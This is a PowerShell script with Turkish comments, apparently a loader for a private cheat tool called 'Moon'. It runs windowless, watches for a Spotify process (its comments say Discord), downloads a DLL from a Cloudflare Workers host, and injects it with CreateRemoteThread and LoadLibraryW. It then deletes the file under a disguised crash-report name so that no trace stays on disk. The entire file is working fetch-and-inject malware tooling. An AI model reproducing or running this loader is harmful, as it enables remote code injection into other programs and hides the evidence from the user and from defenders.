# ============================================================
#  monitor.ps1 — Discord Açılınca Otomatik İndir + Inject [Moon Private]
#
#  Arka planda çalışır, pencere yok.
#  Discord açılınca Cloudflare Workers/R2'den hileyi indirir, inject eder.
#  Discord kapanınca sıfırlar, tekrar açılınca tekrar yapar.
# ============================================================

# ════════════════ SUNUCU AYARLARI (Cloudflare Workers) ════════════════
$SrvHost = "moon-auth-service.moonsal.workers.dev"
$SrvPort = 443
$SrvPath = "/download/payload"
# ═════════════════════════════════════════════════════════════════════

$LogFile  = "$PSScriptRoot\monitor.log"
$TempDll  = "$env:TEMP\SpCrashReport.dll"

function Write-Log($msg) {
    $ts = Get-Date -Format "HH:mm:ss"
    Add-Content -Path $LogFile -Value "[$ts] $msg" -ErrorAction SilentlyContinue
}

# Windows API — inject için
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinInject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out IntPtr written);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr module, string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr GetModuleHandleW(string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out IntPtr threadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr handle, uint timeout);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFreeEx(IntPtr proc, IntPtr addr, uint size, uint freeType);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);
}
"@ -ErrorAction SilentlyContinue

function Download-Payload {
    try {
        # Cloudflare Workers uses HTTPS on port 443
        if ($SrvPort -eq 443) {
            $url = "https://${SrvHost}${SrvPath}"
        } else {
            $url = "http://${SrvHost}:${SrvPort}${SrvPath}"
        }
        Write-Log "İndiriliyor: $url"
        
        # Use TLS 1.2+ for Cloudflare
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocol]::Tls12 -bor [System.Net.SecurityProtocol]::Tls13
        
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Moon/1.0")
        $wc.DownloadFile($url, $TempDll)
        if (Test-Path $TempDll) {
            $size = (Get-Item $TempDll).Length
            Write-Log "İndirme tamam. Boyut: $size byte"
            return $true
        }
    } catch {
        Write-Log "İndirme hatası: $_"
    }
    return $false
}

function Inject-Dll($procId, $dllPath) {
    try {
        $hProc = [WinInject]::OpenProcess(0x1F0FFF, $false, $procId)
        if ($hProc -eq [IntPtr]::Zero) { return $false }

        $bytes  = [System.Text.Encoding]::Unicode.GetBytes($dllPath + "`0")
        $alloc  = [WinInject]::VirtualAllocEx($hProc, [IntPtr]::Zero, $bytes.Length, 0x3000, 0x04)
        if ($alloc -eq [IntPtr]::Zero) { [WinInject]::CloseHandle($hProc); return $false }

        $written = [IntPtr]::Zero
        [WinInject]::WriteProcessMemory($hProc, $alloc, $bytes, $bytes.Length, [ref]$written) | Out-Null

        $k32  = [WinInject]::GetModuleHandleW("kernel32.dll")
        $llw  = [WinInject]::GetProcAddress($k32, "LoadLibraryW")
        $tid  = [IntPtr]::Zero
        $hThr = [WinInject]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $llw, $alloc, 0, [ref]$tid)

        if ($hThr -ne [IntPtr]::Zero) {
            [WinInject]::WaitForSingleObject($hThr, 8000) | Out-Null
            [WinInject]::CloseHandle($hThr) | Out-Null
        }

        [WinInject]::VirtualFreeEx($hProc, $alloc, 0, 0x8000) | Out-Null
        [WinInject]::CloseHandle($hProc) | Out-Null
        return $true
    } catch {
        return $false
    }
}

Write-Log "Monitor başladı. Hedef: Spotify.exe | Sunucu: ${SrvHost}:${SrvPort}"

$injectedPid = 0

while ($true) {
    Start-Sleep -Seconds 2

    # Discord'un ana penceresini olan instance'ını bul
    $discord = Get-Process -Name "Spotify" -ErrorAction SilentlyContinue |
               Where-Object { $_.MainWindowHandle -ne 0 } |
               Select-Object -First 1

    if (-not $discord) {
        $discord = Get-Process -Name "Spotify" -ErrorAction SilentlyContinue |
                   Select-Object -First 1
    }

    if ($discord) {
        $discordPid = $discord.Id

        if ($discordPid -ne $injectedPid) {
            Write-Log "Spotify bulundu (PID: $discordPid). 3sn bekleniyor..."
            Start-Sleep -Seconds 3

            # VDS'den indir
            $downloaded = Download-Payload
            if (-not $downloaded) {
                Write-Log "İndirme başarısız, atlanıyor."
                $injectedPid = 0
                continue
            }

            # Inject et
            $ok = Inject-Dll $discordPid $TempDll
            if ($ok) {
                Write-Log "Inject başarılı! (PID: $discordPid)"
                $injectedPid = $discordPid

                # Dosyayı sil — DLL bellekte kalır, diskte iz kalmaz
                Start-Sleep -Seconds 2
                Remove-Item -Path $TempDll -Force -ErrorAction SilentlyContinue
                Write-Log "Temp dosya silindi."
            } else {
                Write-Log "Inject başarısız. (PID: $discordPid)"
                Remove-Item -Path $TempDll -Force -ErrorAction SilentlyContinue
                $injectedPid = 0
            }
        }
    } else {
        # Discord kapandı — sıfırla
        if ($injectedPid -ne 0) {
            Write-Log "Spotify kapandı. Sıfırlanıyor..."
            $injectedPid = 0
            # Temp dosya kaldıysa sil
            Remove-Item -Path $TempDll -Force -ErrorAction SilentlyContinue
        }
    }
}
